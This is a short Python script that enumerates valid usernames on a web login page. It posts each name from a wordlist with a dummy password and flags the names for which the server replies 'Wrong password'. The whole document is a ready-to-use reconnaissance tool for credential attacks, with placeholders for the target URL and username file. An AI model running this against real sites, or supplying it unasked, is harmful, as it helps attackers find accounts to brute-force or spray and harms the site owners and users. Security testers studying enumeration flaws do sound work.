import requests

## This script checks responses from a webserver depending if the response returns information if a username is valid or not.

url = "www.example.com/login"  # Replace with the actual URL of the login page

file_path = "Enter file path to usernames text file here" #e.g /etc/usernames.txt

try:
    with open(file_path, "r") as file:
        for line in file:
            username = line.strip() # checks every line in file path and strips whitespace and defines it as username
            if not username:
                continue # Skip empty lines

            payload = {
                "username": username,
                "password": "dummy_password"  # Can use any password, this is just to check usernames based on the response from the server
            }
            response = requests.post(url, data=payload)
            if "Wrong password" in response.text:
                print(f"Username found: {username}")
            else:
                continue

except FileNotFoundError: # Check if the file exists
    print(f"File not found: {file_path}")
except requests.exceptions.RequestException as e: # Handle any request exceptions
    print(f"Request failed: {e}")